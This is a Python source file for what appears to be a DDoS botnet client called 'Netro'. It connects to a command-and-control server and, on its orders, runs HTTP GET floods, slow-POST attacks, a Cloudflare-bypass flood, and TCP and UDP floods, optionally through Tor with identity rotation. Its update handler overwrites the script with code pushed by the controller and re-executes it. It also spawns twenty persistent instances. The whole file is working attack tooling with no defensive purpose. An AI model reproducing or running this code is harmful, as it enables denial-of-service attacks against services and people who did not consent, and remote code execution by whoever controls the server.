from urllib.parse import urlparse
import cloudscraper
import subprocess
import threading
import random
import string
import socket
import socks
import time
import json
import ssl
import sys
import os

INSTANCES = 20

with open("./useragents.txt", "r") as file:
    USERAGENTS = file.read().splitlines()
    file.close()

class NetroHTTP(object):
    kill = False
    active_threads = 0

    def __init__(self, url: str, timeout: float, tor_proxies: bool = False):
        self.url = url
        self.tor_proxies = tor_proxies
        parsed_url = urlparse(url)

        if not parsed_url.scheme in ["http", "https"]:
            raise Exception("Invalid URL scheme.")
        
        if timeout < 10:
            raise Exception("Invalid HTTP attack timeout value.")
        
        self.timeout = timeout
        if not self.tor_proxies:
            self.host_ip = socket.gethostbyname(parsed_url.hostname)
        else:
            self.host_ip = None

        if not parsed_url.port:
            if parsed_url.scheme == "https":
                port = 443
            else:
                port = 80
        else:
            port = parsed_url.port
        
        self.port = port
    
        if self.tor_proxies:
            if sys.platform in ["linux", "linux2"]:
                threading.Thread(target=self.tor_renewer, daemon=True).start()

    def tor_renewer(self):
        while True:
            if time.time() >= self.timeout or self.kill:
                break

            os.system("service tor reload")
            time.sleep(5)
    
    def randstr(self, length: int):
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))
        
    def create_attack_instance(self):
        self.active_threads += 1

        try:
            parsed_url = urlparse(self.url)
            if self.tor_proxies:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.set_proxy(socks.SOCKS5, addr="127.0.0.1", port=9050)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host_ip if self.host_ip else parsed_url.hostname, self.port))

            if parsed_url.scheme == "https":
                ctx = ssl._create_unverified_context()
                sock = ctx.wrap_socket(sock=sock, server_hostname=parsed_url.hostname)

            path = "/" if not parsed_url.path else parsed_url.path

            path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"

            for i in range(100):
                if time.time() >= self.timeout or self.kill:
                    break

                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control": "max-age=0",
                    "Connection": "Keep-Alive",
                    "Dnt": "1",
                    "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
                    "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": random.choice(USERAGENTS)
                }

                request_data = f"GET {path_request} HTTP/1.1\r\n"

                for header_name in headers:
                    header_value = headers[header_name]
                    request_data += f"{header_name}: {header_value}\r\n"
                
                request_data += "\r\n"

                sock.send(request_data.encode())

                time.sleep(0.1)
            
            sock.close()

        except Exception:
            return
        
        finally:
            self.active_threads -= 1

class NetroHTTPPost(object):
    kill = False
    active_threads = 0

    def __init__(self, url: str, timeout: float, tor_proxies: bool = False):
        self.url = url
        self.tor_proxies = tor_proxies
        parsed_url = urlparse(url)

        if not parsed_url.scheme in ["http", "https"]:
            raise Exception("Invalid URL scheme.")
        
        if timeout < 10:
            raise Exception("Invalid HTTP attack timeout value.")
        
        self.timeout = timeout
        if not tor_proxies:
            self.host_ip = socket.gethostbyname(parsed_url.hostname)

        if not parsed_url.port:
            if parsed_url.scheme == "https":
                port = 443
            else:
                port = 80
        else:
            port = parsed_url.port
        
        self.port = port
        
        if self.tor_proxies:
            threading.Thread(target=self.tor_renewer, daemon=True).start()
    
    def tor_renewer(self):
        while True:
            if time.time() >= self.timeout or self.kill:
                break

            os.system("service tor reload")
            time.sleep(120)

    def create_attack_instance(self):
        self.active_threads += 1

        try:
            parsed_url = urlparse(self.url)
            if self.tor_proxies:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.set_proxy(proxy_type=socks.SOCKS5, addr="127.0.0.1", port=9050)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host_ip if not self.tor_proxies else parsed_url.hostname, self.port))

            if parsed_url.scheme == "https":
                ctx = ssl._create_unverified_context()
                sock = ctx.wrap_socket(sock=sock, server_hostname=parsed_url.hostname)
            
            path = "/" if not parsed_url.path else parsed_url.path
            path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"

            content_length = random.randint(512, 1024)

            headers = {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Length": content_length,
                "Content-Type": "application/x-www-urlform-encoded",
                "Dnt": "1",
                "Origin": f"{parsed_url.scheme}://{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}/",
                "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
                "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": random.choice(USERAGENTS)
            }
            request_data = f"GET {path_request} HTTP/1.1\r\n"

            for header_name in headers:
                header_value = headers[header_name]
                request_data += f"{header_name}: {header_value}\r\n"
            
            request_data += "\r\n"

            sock.send(request_data.encode())
            
            for i in range(content_length):
                if any([self.kill, time.time() >= self.timeout]):
                    break
                
                sock.send(random._urandom(1))
                time.sleep(1)

        except Exception:
            return
        
        finally:
            self.active_threads -= 1

# HTTP Flood Cloudflare Bypass
class NetroHCF(object):
    kill = False
    active_threads = 0

    def __init__(self, target: str, tor_proxies: bool = False):
        self.target = target
        self.tor_proxies = tor_proxies
        self.scraper = cloudscraper.create_scraper()
    
    def create_attack_instance(self):
        self.active_threads += 1

        try:
            x = self.scraper.get(self.target, proxies={"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"} if self.tor_proxies else None)
            time.sleep(0.1)
        except Exception:
            return
        
        finally:
            self.active_threads -= 1

class NetroTCP(object):
    kill = False
    active_threads = 0

    def __init__(self, target: str, timeout: float, tor_proxies: bool = False):
        host, port = target.split(":", 1)
        port = int(port)

        if any([port < 1, port > 65535]):
            raise Exception("Invalid port value.")
        
        if timeout < 10:
            raise Exception("Invalid timeout value.")
        
        self.timeout = timeout
        self.host = host
        self.port = port
        self.host_ip = socket.gethostbyname(self.host)
        self.tor_proxies = tor_proxies
    
    def create_attack_instance(self):
        self.active_threads += 1

        try:
            if self.tor_proxies:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.set_proxy(proxy_type=socks.SOCKS5, addr="127.0.0.1", port=9050)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            sock.settimeout(10)
            
            sock.connect((self.host_ip, self.port))

            while time.time() < self.timeout and not self.kill:
                sent_data = sock.send(random._urandom(16))

        except Exception:
            return

        finally:
            self.active_threads -= 1

class NetroUDP(object):
    kill = False
    active_threads = 0

    def __init__(self, target: str, timeout: float):
        host, port = target.split(":", 1)
        port = int(port)

        if any([port < 1, port > 65535]):
            raise Exception("Invalid port value.")
        
        if timeout < 10:
            raise Exception("Invalid timeout value.")
        
        self.timeout = timeout
        self.host = host
        self.port = port
        self.host_ip = socket.gethostbyname(host)
    
    def create_attack_instance(self):
        self.active_threads += 1

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            while time.time() < self.timeout and not self.kill:
                sock.sendto(random._urandom(1024), (self.host_ip, self.port))
        except Exception:
            return
        finally:
            self.active_threads -= 1

class NetroAttackManager(object):
    def __init__(self):
        self.running_attacks = {} # attack_id: {attack_payload}

    def attack_handler(self, attack_id: str):
        attack_payload = self.running_attacks[attack_id]
        method = attack_payload["method"]
        target = attack_payload["target"]
        timeout = attack_payload["timeout"]
        concurrency = attack_payload["concurrency"]

        match method:
            case "http":
                netro_attack = NetroHTTP(url=target, timeout=timeout)
            case "http-post":
                netro_attack = NetroHTTPPost(url=target, timeout=timeout)
            case "tor-get":
                netro_attack = NetroHTTP(url=target, timeout=timeout, tor_proxies=True)
            case "tor-post":
                netro_attack = NetroHTTPPost(url=target, timeout=timeout, tor_proxies=True)
            case "tor-hcf":
                netro_attack = NetroHCF(target=target, tor_proxies=True)
            case "tor-tcp":
                netro_attack = NetroTCP(target=target, timeout=timeout, tor_proxies=True)
            case "hcf":
                netro_attack = NetroHCF(target=target)
            case "tcp":
                netro_attack = NetroTCP(target=target, timeout=timeout)
            case "udp":
                netro_attack = NetroUDP(target=target, timeout=timeout)
        
        while time.time() < timeout and attack_id in self.running_attacks:
            time.sleep(0.01)

            if netro_attack.active_threads >= concurrency:
                continue

            threading.Thread(target=netro_attack.create_attack_instance, daemon=True).start()
        
        netro_attack.kill = True
        self.stop_attack(attack_id=attack_id)
    
    def launch_attack(self, attack_id: str, attack_payload: dict):
        method = attack_payload["method"]
        target = attack_payload["target"]
        timeout = attack_payload["timeout"]
        concurrency = attack_payload["concurrency"]
        self.running_attacks[attack_id] = attack_payload

        threading.Thread(target=self.attack_handler, args=[attack_id], daemon=True).start()

        print(f"Attack has been launched!\nID: {attack_id}\nMethod: {method}\nTarget: {target}\nTimeout: {timeout}\nConcurrency: {concurrency}\n")

    def stop_attack(self, attack_id: str):
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            
            print(f"Attack has been stopped. ID: {attack_id}\n")

class NetroBot(object):
    current_sock: socket.socket = None
    heartbeat_interval = 1
    netro_attacks = NetroAttackManager()

    def __init__(self, host: str, port: int, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
    
    def verify_sock(self, sock: socket.socket):
        if sock == self.current_sock:
            return True
        else:
            return False

    def start(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                self.current_sock = sock
                sock.connect((self.host, self.port))

                self.send_message(sock=sock, message={"op": "LOGIN", "hostname": f"{socket.gethostname()}"})

                threading.Thread(target=self.handler, args=[sock], daemon=True).start()
                threading.Thread(target=self.heartbeat_handler, args=[sock], daemon=True).start()

                break
            except Exception:
                time.sleep(5)
                continue
        
    def handler(self, sock: socket.socket):
        try:
            while True:
                message = b""

                while True:
                    if not self.verify_sock(sock=sock):
                        raise Exception("New sock has been created.")
                    
                    chunk = sock.recv(1)

                    if not chunk:
                        raise Exception("Connection closed.")
                    
                    message += chunk

                    if message.endswith(b"\r\n\r\n"):
                        break
                
                self.on_message(sock=sock, message=json.loads(message))
        except Exception:
            time.sleep(5)
            self.start()

    def heartbeat_handler(self, sock: socket.socket):
        try:
            sequence = 0

            while True:
                if not self.verify_sock(sock=sock):
                    raise Exception("New sock has been created.")
                
                heartbeat_payload = {
                    "op": "PING",
                    "sequence": sequence
                }

                sequence += 1

                self.send_message(sock=sock, message=heartbeat_payload)

                time.sleep(self.heartbeat_interval)
        except Exception:
            return

    def on_message(self, sock: socket.socket, message: dict):
        if not "op" in message:
            raise Exception("Invalid message.")
        
        match message["op"]:
            case "ATTACK_LIST":
                self.on_attack_list_update(sock=sock, message=message)
            case "COMMAND":
                self.on_command(sock=sock, command_data=message)
            case "UPDATE":
                self.on_update(sock=sock, message=message)
    
    def on_attack_list_update(self, sock: socket.socket, message: dict):
        running_attacks = message["running_attacks"]
        netro_running_attacks = self.netro_attacks.running_attacks

        for attack_id in netro_running_attacks:
            if not attack_id in running_attacks:
                self.netro_attacks.stop_attack(attack_id=attack_id)
        
        for attack_id in running_attacks:
            if not attack_id in netro_running_attacks:
                self.netro_attacks.launch_attack(attack_id=attack_id, attack_payload=running_attacks[attack_id])

    def on_command(self, sock: socket.socket, command_data: dict):
        if not "command" in command_data:
            raise Exception("Invalid command data.")
        
        match command_data["command"]:
            case "launch":
                self.on_launch(attack_payload=command_data["attack_payload"])
            case "stop_attack":
                self.netro_attacks.stop_attack(attack_id=command_data["attack_id"])
    
    def on_update(self, sock: socket.socket, message: dict):
        print(f"Received an update command from the CNC.")

        script_content = message["script_content"]

        with open(__file__, "w") as file:
            file.write(script_content)
            file.close()

        print(f"Successfully updated netro_bot.py, re-initializing...")

        os.execv(sys.executable, ["python3" if sys.platform == "linux" else "python"] + sys.argv)

    def on_launch(self, attack_payload: dict):
        attack_id = attack_payload["id"]
        del attack_payload["id"]

        self.netro_attacks.launch_attack(attack_id=attack_id, attack_payload=attack_payload)

    def send_message(self, sock: socket.socket, message: dict):
        if not self.verify_sock(sock=sock):
            raise Exception("New sock has been created.")

        return sock.send(json.dumps(message).encode() + b"\r\n\r\n")

def deploy_instances():
    total_instances = len(subprocess.getoutput("ps -ef | grep netro_bot.py | grep -v grep | grep -v SCREEN").splitlines())
    print(f"Total Instances: {total_instances}")

    if total_instances > INSTANCES:
        exit()
        
    if total_instances < INSTANCES:
        for i in range(INSTANCES - total_instances):
            if total_instances >= INSTANCES:
                break
            subprocess.Popen(["screen", "-d", "-m", "python3", "netro_bot.py"])
            time.sleep(1)
            

def main():
    deploy_instances()

    config = json.load(open("cnc_config.json", "r"))

    netro_bot = NetroBot(host=config["IP"], port=config["PORT"])
    threading.Thread(target=netro_bot.start, daemon=True).start()

    print(f"Netro bot initialized.")

    input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
